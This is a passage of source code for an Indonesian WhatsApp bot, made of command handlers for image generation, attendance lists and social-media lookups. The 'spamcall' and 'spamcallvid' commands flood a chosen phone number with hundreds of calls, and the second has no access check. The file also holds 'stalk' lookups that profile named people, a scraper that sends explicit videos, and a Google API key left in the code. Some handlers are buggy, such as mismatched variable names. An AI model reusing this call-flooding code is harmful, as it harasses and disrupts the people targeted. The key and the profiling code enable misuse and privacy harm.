if (!isCreator) return tolak(`Sok asik bangsat`);
const omaaavaaaaaaaa = ` ${textunbanv19}`
ReplyLanz(omaaavaaaaaaaa)
break
case 'textunbanv20':
if (!isCreator) return tolak(`Sok asik bangsat`);
const bykepo = ` ${textunbanv20}`
ReplyLanz(bykepo)
break
case 'textunbanv21':
if (!isCreator) return tolak(`Sok asik bangsat`);
const unbannned = ` ${textunbanv21}`
ReplyLanz(unbannned)
break
case 'textunbanpremv1':
if (!isCreator) return tolak(`Sok asik bangsat`);
const premi = ` ${textunbanpremv1}`
ReplyLanz(premi)
break
case 'textunbanpremv2':
if (!isCreator) return tolak(`Sok asik bangsat`);
const kelasss = ` ${textunbanpremv2}`
ReplyLanz(kelasss)
break
case 'textunbanpremv3':
if (!isCreator) return tolak(`Sok asik bangsat`);
const eek = ` ${textunbanpremv3}`
ReplyLanz(eek)
break

case 'getcase': {
 
 try {
 if (!isCreator) return ReplyLanz("❗ *Access Denied*\nFitur Only `Owner`")
 if (!text) return ReplyLanz('❌ Masukkan nama case!\n\nContoh: .getcase menu');
 const caseFilePath = './system/Putzz.js'; // Sesuaikan dengan lokasi file case.js
 // Baca isi file case.js dan pecah menjadi array berdasarkan baris
 let caseFileContent = fs.readFileSync(caseFilePath, 'utf8');
 let caseLines = caseFileContent.split('\n');
 // Regex untuk mencari case "nama" atau case 'nama'
 let caseRegex = new RegExp(`^\\s*case\\s+['"]${text}['"]\\s*:`);
 let startLine = null;
 let endLine = null;
 let foundCase = null;
 // Loop untuk mencari case yang diminta
 for (let i = 0; i < caseLines.length; i++) {
 if (caseRegex.test(caseLines[i])) {
 startLine = i;
 foundCase = [];
 // Menyimpan isi case hingga menemukan `break;`
 for (let j = i; j < caseLines.length; j++) {
 foundCase.push(caseLines[j]);
 if (/^\s*break\s*/.test(caseLines[j])) {
 endLine = j;
 break;
 }
 }
 break;
 }
 }
 if (!foundCase) return ReplyLanz(`❌ Case *${text}* tidak ditemukan!`);
 // Gabungkan isi case menjadi teks
 let caseContent = foundCase.join('\n');
 // Pesan konfirmasi
 let teksnya = `💌 \`Case ditemukan!\`\n\n*Nama Case :* ${text}\n*Baris :* ${startLine + 1} - ${endLine + 1}\n\n> © LanzOffc`;
 // Kirim dengan tombol CTA Copy
 let msgii = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: { 
 message: { 
 "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 }, 
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({ text: teksnya }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
 "display_text": "Salin Isi Case",
 "copy_code": caseContent
 })
 }
 ]
 })
 })
 } 
 }
 }, { userJid: m.sender, quoted: qlive });
 await Putzz.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id });
 } catch (error) {
 console.error('Error saat mencari case:', error);
 ReplyLanz('❌ Gagal mencari case.');
 }
}
break
case 'getcae':
 case 'findcase': {
    if (!isCreator) return ReplyLanz(mess.owner)
    if (!text) return ReplyLanz('Harap masukkan kata kunci pencarian case! 🔍')
    try {
        const fileContent = fs.readFileSync("./system/Putzz.js", "utf-8"), caseBlocks = fileContent.split(/case\s+['"`]([^'"`]+)['"`]/g)
        if (caseBlocks.length < 2) throw new Error('No cases found')
        let foundCases = []
        for (let i = 1; i < caseBlocks.length; i += 2) {
            const caseName = caseBlocks[i]
            if (caseName.toLowerCase().includes(text.toLowerCase())) {
                const caseContent = caseBlocks[i+1].split("break")[0]
                foundCases.push({ name: caseName, content: `case '${caseName}'${caseContent}break` })
            }
        }
        if (foundCases.length === 0) return ReplyLanz(`Tidak ditemukan case yang mengandung "${text}"`)
        let ReplyText = `Ditemukan ${foundCases.length} case yang mengandung "${text}":\n\n`
        foundCases.forEach((c, i) => ReplyText += `*${i+1}. ${c.name}*\n${c.content}\n\n`)
        if (replyText.length > 1000000) {
            const parts = []
            while (replyText.length > 0) { parts.push(replyText.substring(0, 1000000)); ReplyText = ReplyText.substring(1000000) }
            parts.forEach(part => ReplyLanz(part))
        } else ReplyLanz(replyText)
    } catch (err) { ReplyLanz(`Gagal mencari case: ${err.message}`) }
    }
    break
case 'hijabgkan': case 'tohijbab': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let defaultPrompt = "Buatkan Karakter Yang Ada Di Gambar Tersebut Agar Diberikan Hijab Warna Putih Hijab Ala Orang Indonesia Dan Jangan Sampai Rambutnya Terlihat, Semua Tertutup";
    if (!mime) {
        ReplyLanz("Tidak ada gambar yang direply, membuat gambar default...");
        mime = "image/png";
        q = { msg: { mimetype: mime }, download: async () => fs.readFileSync("default_image.png") };
    }
    if (!/image\/(jpe?g|png)/.test(mime)) return ReplyLanz(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
    let promptText = text || defaultPrompt;
    ReplyLanz("Otw Di Hijabkan...");
    try {
        let imgData = await q.download();
        let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
        const base64Image = imgData.toString("base64");
        const contents = [
            { text: promptText },
            {
                inlineData: {
                    mimeType: mime,
                    data: base64Image
                }
            }
        ];
        const model = genAI.getGenerativeModel({
            model: "gemini-2.0-flash-exp-image-generation",
            generationConfig: {
                responseModalities: ["Text", "Image"]
            },
        });
        const response = await model.generateContent(contents);
        let resultImage;
        let resultText = "";
        for (const part of response.response.candidates[0].content.parts) {
            if (part.text) {
                resultText += part.text;
            } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
            }
        }
        if (resultImage) {
            const tmpDir = path.join(process.cwd(), "tmp");
            if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
            }
            let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
            fs.writeFileSync(tempPath, resultImage);
            await Putzz.sendMessage(m.chat, { 
                image: { url: tempPath },
                caption: `*Waifu Halal Halal*`
            }, { quoted: m });
            setTimeout(() => {
                try {
                    fs.unlinkSync(tempPath);
                } catch (err) {
                    console.error("Failed to delete temp file:", err);
                }
            }, 30000);
        } else {
            ReplyLanz("Gagal Di Hijabkan Dosa Nya Ke gedean Ini Mah.");
        }
    } catch (error) {
        console.error(error);
        ReplyLanz(`Error: ${error.message}`);
    }
}
break
case 'mulaiabsen': {
if (!m.isGroup) return ReplyLanz('Hanya Di Group')
 const chatId = m.chat; 
 

 
 if (absenData[chatId]) {
 Reply ('Absen sudah dimulai di obrolan ini!');
 }

 
 absenData[chatId] = {
 admin: userId, 
 participants: [], 
 };

 
 ReplyLanz('Absen telah dimulai! Gunakan perintah *.absen* untuk bergabung dalam absen ini.');
}
//D|ts si pler 🐎
break ;
case 'absen': {
if (!m.isGroup) return ReplyLanz('Hanya Di Group')
 const chatId = m.chat; 
 
 
 if (!absenData[chatId]) {
 m.reply ('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
 }
 var vsbhsbbeheheh = Putzz.getName(m.sender)
 absenData[chatId].participants.push(vsbhsbbeheheh);

 ReplyLanz('Anda telah berhasil bergabung dalam proses absen!');
}
//D|ts si pler 🐎
break ;
case 'cekabsen': {
if (!m.isGroup) return ReplyLanz('Hanya Di Group')
 const chatId = m.chat;
 
 
 if (!absenData[chatId]) {
 ReplyLanz('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
 }

 
 const participants = absenData[chatId].participants;
 
 ReplyLanz(`Daftar peserta absen:\n${participants.join(', ')}`);
}
//D|ts si pler 🐎
break ;

case 'hapusabsen': {
if (!m.isGroup) return ReplyLanz('Hanya Di Group')
 
 const chatId = m.chat;
 if (absenData[chatId] && absenData[chatId].admin === m.sender) {
 
 delete absenData[chatId];
 
 ReplyLanz('Proses absen telah dihapus!');
 } else {
 ReplyLanz('Anda tidak memiliki izin untuk menghapus proses absen!');
 }
}
//D|ts si pler 🐎
break 

case 'aigen':
case 'aiimage': {
 if (!text) return ReplyLanz(`🚨 Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);
 ReplyLanz("🎨 Generating AI Image...");
 try {
// const  require("axios");
 async function generateImage(prompt) {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
 };
 let { data } = await axios.get(url, { headers });
 if (data && data.image_link) return { success: true, imageUrl: data.image_link };
 return { success: false, message: "❌ Gagal mendapatkan gambar!" };
 }
 let result = await generateImage(text);
 if (!result.success) return ReplyLanz(result.message);
 await Putzz.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
 await Putzz.sendMessage(m.chat, { 
 image: { url: result.imageUrl }, 
 caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
 }, { quoted: m });
 ReplyLanz("✅ Gambar berhasil dibuat!");
 } catch (err) {
 console.error(err);
 ReplyLanz("❌ Terjadi kesalahan saat membuat gambar!");
 }
}
break
case 'createquote2': case 'quoteimg2': {
 if (!text) return ReplyLanz(`*Cara pakai fitur Quote:*\n\nKetik:\n*createquote2 teks | username | tanda tangan | ppUrl*\n\nContoh tanpa ppUrl (otomatis pakai foto profil kamu):\ncreatequote2 Aku semangat! | Biyu | Official\n\nContoh dengan gambar custom:\ncreatequote2 Semangat terus! | Biyu | Admin | https:/xxxxxx.jpg`)
 let [isi, usern = '', sign = '', ppUrl = ''] = text.split("|").map(v => v.trim())
 if (!isi) return ReplyLanz('Teks quote tidak boleh kosong.')
 if (!ppUrl) {
 ppUrl = await Putzz.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg')
 }
 let url = `https://fastrestapis.fasturl.cloud/maker/quote?text=${encodeURIComponent(isi)}&username=${encodeURIComponent(usern)}&ppUrl=${encodeURIComponent(ppUrl)}&signature=${encodeURIComponent(sign)}`
 
 try {
 Putzz.sendMessage(m.chat, { image: { url }, caption: "Berhasil dibuat!" }, { quoted: m })
 } catch (e) {
 console.log('Gagal kirim quote:', e)
 ReplyLanz('Gagal membuat quote, coba lagi nanti.')
 }
}
break

case 'createquote': 
case 'quoteimg': {
  if (!text) return ReplyLanz('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
  const { createCanvas, loadImage } = require('canvas');
  function wrapText(ctx, text, maxWidth) {
    const words = text.split(' ');
    let lines = [];
    let currentLine = words[0];
    for (let i = 1; i < words.length; i++) {
      const word = words[i];
      const width = ctx.measureText(currentLine + ' ' + word).width;
      if (width < maxWidth) {
        currentLine += ' ' + word;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    lines.push(currentLine);
    return lines;
  }
  async function generateQuoteImage(ppUrl, username, quoteText) {
    const width = 1000;
    const height = 500;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, width, height);
    const avatar = await loadImage(ppUrl);
    ctx.save();
    ctx.beginPath();
    ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(avatar, 60, 130, 240, 240);
    ctx.restore();
    ctx.fillStyle = '#ffffff';
    ctx.font = '28px sans-serif';
    let lines = wrapText(ctx, quoteText, 600);
    lines.forEach((line, i) => {
      ctx.fillText(line, 350, 180 + i * 35);
    });
    ctx.fillStyle = '#aaaaaa';
    ctx.font = '22px italic';
    ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
    return canvas.toBuffer();
  }
  let pushname = m.pushName || m.sender.split('@')[0];
  let ppUrl = await Putzz.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg');
  let buffer = await generateQuoteImage(ppUrl, pushname, text);

  await Putzz.sendMessage(m.chat, {
    image: buffer,
    caption: `📝 Quote dari *${m.pushName}*\n\n> Biyu`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}
break
      case "instagramstalk2":
      case "igstalk2":
        {
          if (!text) {
            return ReplyLanz(`Enter Instagram Username\n\nContoh: ${prefix + command} DinzDinzID`);
          }
          Putzz.sendMessage(m.chat, {
            react: {
              text: "🕒",
              key: m.key
            }
          });
          try {
            const dat = await fetchJson(`https://api.vreden.web.id/api/igstalk?query=${text}`);
            if (!dat || !dat.result) {
              return Putzz.sendMessage(m.chat, {
                text: "Data tidak ditemukan atau API error."
              }, {
                quoted: m
              });
            }
            const data = dat.result;
            const data1 = dat.result.stats;
            const te = `
┌──「 *STALKING* 」
▢ *🔖Name:* ${data.fullName} 
▢ *🔖Username:* ${data.username.replace(/^@/, "")}
▢ *👥Follower:* ${data1.followers}
▢ *🫂Following:* ${data1.following}
▢ *📌Bio:* ${data.bio}
▢ *🏝️Posts:* ${data1.posts}
▢ *🔗 Link:* https://instagram.com/${data.username.replace(/^@/, "")}
└────────────`;
            await Putzz.sendMessage(m.chat, {
              image: {
                url: data.profilePic
              },
              caption: te
            }, {
              quoted: m
            });
          } catch {
            ReplyLanz(`Pastikan nama pengguna berasal dari *Instagram*`);
          }
        }
        break;
      case "tiktokstalk":
      case "ttstalk":
        {
          if (!text) {
            return ReplyLanz(`Masukkan TikTok Username\n\nContoh: ${prefix + command} DinzDinzID`);
          }
          Putzz.sendMessage(m.chat, {
            react: {
              text: "🕒",
              key: m.key
            }
          });
          try {
            const respon = await fetchJson(`https://theresapis.vercel.app/stalk/tiktok?apikey=theresa&username=${encodeURIComponent(text)}`);
            const user = respon.result.user;
            const stats = respon.result.stats;
            let teks = `
┌──「 *STALKING* 」
▢ *🔖 Name:* ${nickname}
▢ *🔖 Username:* ${user.uniqueId}
▢ *👥 Followers:* ${stats.followerCount}
▢ *🫂 Following:* ${stats.followingCount}
▢ *📌 Bio:* ${user.signature}
▢ *🏝️ Posts:* ${stats.videoCount}
▢ *❣️ Likes:* ${stats.heartCount}
▢ *🔗 Link:* https://tiktok.com/@${user.uniqueId}
└────────────`;
            await Putzz.sendMessage(m.chat, {
              image: {
                url: user.avatarLarger
              },
              caption: teks
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            ReplyLanz(`Terjadi kesalahan. Pastikan username berasal dari TikTok.`);
          }
        }
        break;

case "tiktokstal2k": case "ttstalk2": {
    if (!text) return ReplyLanz(`Example: ${prefix + command} username`);
    try {
        let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/tools/tiktokstalk?user=${text}`);
        let data = await api.json();
        if (!data.status) return ReplyLanz('User not found!');
        let caption = `乂 *TIKTOK STALK*

◦ *Name* : ${data.result.nama}
◦ *Username* : ${data.result.user}
◦ *Bio* : ${data.result.bio}
◦ *Followers* : ${data.result.followers}
◦ *Following* : ${data.result.following}
◦ *Private* : ${data.result.privatemode ? 'Yes' : 'No'}`;
        await Putzz.sendMessage(m.chat, { 
            image: { url: data.result.profile },
            caption: caption 
        });
    } catch (e) {
        console.log(e);
        ReplyLanz('Error occurred while fetching data!');
    }
}
break

case "ytstalk": case "infoyt": case "youtubestalk": {
 if (!text) return ReplyLanz(example("ytstalk namaChannel"))
 try {
 const apiUrl = `https://fastrestapis.fasturl.cloud/stalk/youtube/simple?username=${encodeURIComponent(text)}`
 const response = await fetch(apiUrl)
 const data = await response.json()
 if (data.status !== 200) {
 return ReplyLanz(`Error: ${data.content || "Failed to fetch data"}`)
 }
 const result = data.result
 const additionalInfo = result.additionalInfo
 let caption = `*🔍 YOUTUBE CHANNEL INFO*\n\n`
 caption += `*Channel:* ${result.channel}\n`
 caption += `*Description:* ${result.description || "No description"}\n`
 caption += `*URL:* ${result.url}\n\n`
 caption += `*📊 STATS*\n`
 caption += `*Subscribers:* ${additionalInfo.totalSubs || "0"}\n`
 caption += `*Total Videos:* ${additionalInfo.totalVideos || "0"}\n`
 caption += `*Total Views:* ${additionalInfo.views || "0"}\n`
 caption += `*Joined:* ${additionalInfo.join || "Unknown"}\n`
 if (result.socialMediaLinks && result.socialMediaLinks.length > 0) {
 caption += `\n*🔗 SOCIAL MEDIA*\n`
 result.socialMediaLinks.forEach((link, index) => {
 caption += `${index + 1}. ${link.url}\n`
 })
 }
 if (result.latestVideos && result.latestVideos.length > 0) {
 caption += `\n*📺 LATEST VIDEOS*\n`
 for (let i = 0; i < Math.min(3, result.latestVideos.length); i++) {
 const video = result.latestVideos[i]
 caption += `${i + 1}. *${video.title}*\n`
 caption += ` Views: ${video.views}\n`
 caption += ` URL: ${video.videoUrl}\n\n`
 }
 }
 await Putzz.sendMessage(m.chat, {
 image: { url: result.profile },
 caption: caption
 }, { quoted: m })
 } catch (error) {
 console.log(error)
 ReplyLanz('Error saat mengambil informasi channel YouTube')
 }
}
break
 case 'telegram': case 'tele': case 'telestalk': {
  if (!q) return ReplyLanz(`Masukkan usernamenya!\nContoh: ${prefix + command} BiyuOffc`)
  try {
    const res = await fetch(`https://www.velyn.biz.id/api/stalk/telegramstalk?username=${q}`)
    const json = await res.json()
    if (!json.status) return ReplyLanz('Username tidak ditemukan!')
    const { title, description, url, image_url } = json.data
    const teks = `*Telegram Info*\n\n*Nama:* ${title}\n*Bio:* ${description}\n*Link:* ${url}`
    Putzz.sendMessage(m.chat, {
      image: { url: image_url },
      caption: teks
    }, { quoted: m })
  } catch {
    ReplyLanz('Gagal mengambil data.')
  }
}
  break
case 'ytstalk3': case 'stalkyt3': {
  if (!text) return ReplyLanz('Masukkan username YouTube!\nContoh: ytstalk BiyuOffc')

  let res = await fetch(`https://www.velyn.biz.id/api/stalk/youtubestalk?username=${encodeURIComponent(text)}`)
  let json = await res.json()
  if (!json.status) return ReplyLanz('Gagal mengambil data.')
  let { channelMetadata, videoDataList } = json.data
  let teks = `*YOUTUBE STALK*\n`
  teks += `*Username:* ${channelMetadata.username}\n`
  teks += `*Subscriber:* ${channelMetadata.subscriberCount}\n`
  teks += `*Link Channel:* ${channelMetadata.channelUrl}\n`
  teks += `*Deskripsi:* ${channelMetadata.description || '-'}\n\n`
  teks += `*Video Terbaru:*\n`
  for (let vid of videoDataList) {
    teks += `• *${vid.title}*\n`
    teks += `Durasi: ${vid.duration}\n`
    teks += `Upload: ${vid.publishedTime}\n`
    teks += `Views: ${vid.viewCount}\n`
    teks += `https://youtube.com${vid.navigationUrl}\n\n`
  }

  Putzz.sendMessage(m.chat, {
    image: { url: channelMetadata.avatarUrl },
    caption: teks,
    contextInfo: {
      externalAdReply: {
        title: channelMetadata.username,
        body: channelMetadata.subscriberCount,
        thumbnailUrl: channelMetadata.avatarUrl,
        sourceUrl: channelMetadata.channelUrl,
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true
      }
    }
  }, { quoted: m })
}
break
case 'epep': case 'ff': case 'ffstalk': {
  if (!q.includes(',')) return ReplyLanz(`Contoh: ${prefix + command} 537212033,ID`)
  let [id, region] = q.split(',').map(x => x.trim())
  if (!id || !region) return ReplyLanz(`Contoh: ${prefix + command} 537212033,ID`)
  
  try {
    let res = await fetch(`https://www.velyn.biz.id/api/stalk/FreeFireStalk?id=${id}&region=${region}`)
    let json = await res.json()
    if (!json.status) return ReplyLanz("Data tidak ditemukan!")
    let data = json.data.AccountInfo
    let guild = json.data.GuildInfo || {}
    let social = json.data.socialinfo || {}
    let pet = json.data.petInfo || {}
    let captain = json.data.captainBasicInfo || {}
    let credit = json.data.creditScoreInfo || {}

    let teks = `*「 STALK FREE FIRE 」*\n\n`
    teks += `*Nama:* ${data.AccountName}\n`
    teks += `*ID:* ${id}\n`
    teks += `*Region:* ${data.AccountRegion}\n`
    teks += `*Level:* ${data.AccountLevel}\n`
    teks += `*EXP:* ${data.AccountEXP.toLocaleString()}\n`
    teks += `*Likes:* ${data.AccountLikes}\n`
    teks += `*BR Rank Point:* ${data.BrRankPoint}\n`
    teks += `*CS Rank Point:* ${data.CsRankPoint}\n`
    teks += `*Badge BP:* ${data.AccountBPBadges}\n`
    teks += `*Tanggal Buat Akun:* ${new Date(data.AccountCreateTime * 1000).toLocaleString()}\n`
    teks += `*Login Terakhir:* ${new Date(data.AccountLastLogin * 1000).toLocaleString()}\n`
    teks += `*Versi Rilis:* ${data.ReleaseVersion}\n\n`
    teks += `*「 GUILD 」*\n`
    teks += `*Nama Guild:* ${guild.GuildName || '-'}\n`
    teks += `*Level:* ${guild.GuildLevel || '-'}\n`
    teks += `*Member:* ${guild.GuildMember || '-'} / ${guild.GuildCapacity || '-'}\n\n`
    teks += `*「 PET 」*\n`
    teks += `*Level:* ${pet.level || '-'}\n`
    teks += `*EXP:* ${pet.exp || '-'}\n\n`
    teks += `*「 SOSIAL 」*\n`
    teks += `*Bahasa:* ${social.AccountLanguage || '-'}\n`
    teks += `*Mode Favorit:* ${social.AccountPreferMode || '-'}\n`
    teks += `*Status:* ${social.AccountSignature || '-'}\n\n`
    teks += `*「 CAPTAIN 」*\n`
    teks += `*Nama:* ${captain.nickname || '-'}\n`
    teks += `*Level:* ${captain.level || '-'}\n`
    teks += `*Rank:* ${captain.rank || '-'} (${captain.rankingPoints || 0} pts)\n`
    teks += `*CS Rank:* ${captain.csRank || '-'} (${captain.csRankingPoints || 0} pts)\n`
    teks += `*Likes:* ${captain.liked || '-'}\n`
    teks += `*Login Terakhir:* ${new Date(captain.lastLoginAt * 1000).toLocaleString()}\n\n`
    teks += `*「 CREDIT SCORE 」*\n`
    teks += `*Nilai:* ${credit.creditScore || '-'}\n`
    teks += `*Periode:* ${new Date(credit.periodicSummaryStartTime * 1000).toLocaleDateString()} - ${new Date(credit.periodicSummaryEndTime * 1000).toLocaleDateString()}\n`
    ReplyLanz(teks)
  } catch (e) {
    console.log(e)
    ReplyLanz('Gagal mengambil data. Pastikan ID dan region benar.')
  }
  }
  break
 
 case "ml": case "mlstalk": {
  let inputData;
  if (args.length >= 2) {
    inputData = args[1].split('|');
  } else if (body.trim().includes('|')) {
    inputData = body.trim().split(/\s+/)[1].split('|');
  } else {
    ReplyLanz('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  if (inputData.length < 2) {
    ReplyLanz('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  const userId = inputData[0];
  const zoneId = inputData[1];
//  const  require('axios');
  axios.get(`https://vapis.my.id/api/ml-stalk?id=${userId}&zoneid=${zoneId}`)
    .then(response => {
      const result = response.data;
      if (result.status && result.data.status.code === 0) {
        const userData = result.data.data;
        const productData = userData.product;
        const caption = `*✅ ML ACCOUNT FOUND*\n\n` +
          `*🎮 Game*: ${productData.name}\n` +
          `*👤 Username*: ${userData.userNameGame}\n` +
          `*🆔 User ID*: ${userData.gameId}\n` +
          `*🌐 Zone ID*: ${userData.zoneId}\n` +
          `_Mobile Legends: Bang Bang_`;
        ReplyLanz(caption);
      } else {
        const errorMsg = result.data?.status?.message || 'Terjadi kesalahan saat mencari data.';
        ReplyLanz(`❌ Error: ${errorMsg}`);
      }
    })
    .catch(error => {
      console.error(error);
      ReplyLanz('❌ Gagal menghubungi API. Silakan coba lagi nanti.');
    });
} break
case "xvid": case "xxx": case "xvideo": {
    ReplyLanz(`Hello, video akan dikirim secara private hehe~`);
    try {
//const  require('axios');
// = require('cheerio');
        let page = Math.floor(Math.random() * 1153);
        let { data } = await axios.get(`https://sfmcompile.club/page/${page}`);
        let $ = cheerio.load(data);
        let hasil = [];
        $('#primary > div > div > ul > li > article').each((_, b) => {
            let title = $(b).find('header > h2').text().trim();
            let link = $(b).find('header > h2 > a').attr('href');
            let category = $(b).find('header > div.entry-before-title > span > span').text().replace('in ', '').trim();
            let share_count = $(b).find('header > div.entry-after-title > p > span.entry-shares').text().trim();
            let views_count = $(b).find('header > div.entry-after-title > p > span.entry-views').text().trim();
            let type = $(b).find('source').attr('type') || 'image/jpeg';
            let video_1 = $(b).find('source').attr('src') || $(b).find('img').attr('data-src');
            if (video_1) {
                hasil.push({ title, link, category, share_count, views_count, type, video_1 });
            }
        });
        if (!hasil.length) {
            return ReplyLanz(`Maaf, tidak dapat menemukan video.`);
        }
        let tan = hasil[Math.floor(Math.random() * hasil.length)];
        let caption = `
⭔ *Title* : ${tan.title}
⭔ *Category* : ${tan.category}
⭔ *Mimetype* : ${tan.type}
⭔ *Views* : ${tan.views_count}
⭔ *Shares* : ${tan.share_count}
⭔ *Source* : ${tan.link}
⭔ *Media Url* : ${tan.video_1}
`;
        await Putzz.sendMessage(m.sender, { video: { url: tan.video_1 }, caption }, { quoted: m });
    } catch (error) {
        console.error("Error fetching video:", error);
        ReplyLanz("Terjadi kesalahan saat mengambil video.");
    }
}
break
case 'spamcallvid': {
    if (!q) return ReplyLanz("Example use:\n\nspamcallvid 62xxx|jumlah\nor Reply/tag someone.\n\nExample:\nspamcallvid 62895640071400|1000");
    let targetNumber = q.split("|")[0];
    let jumlahSpam = q.split("|")[1] ? parseInt(q.split("|")[1]) : 500;
    let target = m.mentionedJid[0] ? 
        m.mentionedJid[0] : 
        m.quoted ? 
            m.quoted.sender : 
            targetNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (isNaN(jumlahSpam) || jumlahSpam <= 0) jumlahSpam = 500; 
    ReplyLanz(`*LOADING*-\n- \`${jumlahSpam} VID CALL\` - PROCESS SENDING, PLEASE WAIT WHILE *BOT IS STILL WORKING* > MORTAL PROCESS...`);
    await sleep(1000);
    async function sendOfferVideoCall(target) {
        try {
            await Putzz.offerCall(target, { video: true });
            console.log(chalk.white.bold('Success Send Offer Video Call To Target.'));
        } catch (error) {
            console.error(chalk.white.bold('Failed Send Offer Video Call To Target:'), error);
        }
    }
    for (let i = 0; i < jumlahSpam; i++) {
        await sendOfferVideoCall(target);
    }
}
break
case 'spamcall': {
    if (!isCreator) return ReplyLanz(mess.owner)
    if (!q) return ReplyLanz("Example use:\n\nspamcall 62xxx|jumlah\nor Reply/tag someone.\n\nExample:\nspamcall 62895640071400|1000");
    let targetNumber = q.split("|")[0];
    let jumlahSpam = q.split("|")[1] ? parseInt(q.split("|")[1]) : 500;
    let target = m.mentionedJid[0] ? 
        m.mentionedJid[0] : 
        m.quoted ? 
            m.quoted.sender : 
            targetNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (isNaN(jumlahSpam) || jumlahSpam <= 0) jumlahSpam = 500; 
    ReplyLanz(`*LOADING*-\n- \`${jumlahSpam} CALL\` - PROCESS SENDING, PLEASE WAIT WHILE *BOT IS STILL WORKING* > MORTAL PROCESS...`);
    await sleep(1000);
    async function sendOfferCall(target) {
        try {
            await Putzz.offerCall(target);
            console.log(chalk.white.bold('Success send offer call to target.'));
        } catch (error) {
            console.error(chalk.white.bold('Failed to send offer call to target:'), error);
        }
    }
    for (let i = 0; i < jumlahSpam; i++) {
        await sendOfferCall(target);
    }
}
break
case 'gptimage': {
    if (!text) return ReplyLanz('Kasih Deks Gmabr ny\n\nExample : .gptimage long haired anime girl with blue eyes')

    ReplyLanz('Wait...')

    const gpt1image = async (yourImagination) => {
        const headers = {
            "content-type": "application/json",
            "referer": "https://gpt1image.exomlapi.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }

        const body = JSON.stringify({
            "prompt": yourImagination,
            "n": 1,
            "size": "1024x1024",
            "is_enhance": true,
            "response_format": "url"
        })

        const response = await fetch("https://gpt1image.exomlapi.com/v1/images/generations", {
            headers,
            body,
            method: "POST"
        })

        if (!response.ok) throw Error(`fetch gagal di alamat ${response.url} ${response.status} ${response.statusText}.`)

        const json = await response.json()
        const url = json?.data?.[0]?.url

        if (!url) throw Error("fetch berhasil tapi url result nya kosong" + (json.error ? ", error dari server : " + json.error : "."))

        return url
    }

    try {
        const imageUrl = await gpt1image(text)
        await Putzz.sendMessage(m.chat, {
            image: { url: imageUrl }
        }, { quoted: qtext })
    } catch (error) {
        ReplyLanz(`${error.message}`)
    }
}
break;
case 'deepimg': {
 if (!text) return ReplyLanz("Masukkan prompt gambar.")
 ReplyLanz("Sedang memproses gambar, mohon tunggu...")
 try {
//const  require('axios');
 let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
 prompt: text,
 size: "1024x1024",
 device_id: `dev-${Math.floor(Math.random() * 1000000)}`
 }, {
 headers: {
 "Content-Type": "application/json",
 Origin: "https://deepimg.ai",
 Referer: "https://deepimg.ai/"
 }
 })
 let imageUrl = data?.data?.images?.[0]?.url
 if (!imageUrl) return ReplyLanz("Gagal membuat gambar. Coba ganti promptnya.")
 await Putzz.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}` 
 }, { quoted: m })
 } catch (err) {
 console.error(err.response ? err.response.data : err.message)
 ReplyLanz("Terjadi kesalahan saat memproses gambar.")
 }
}
break
case "ainsfw": {
 if (!text) return ReplyLanz("Silakan masukkan prompt untuk menghasilkan gambar.");
 async function generateImage(prompt) {
 try {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
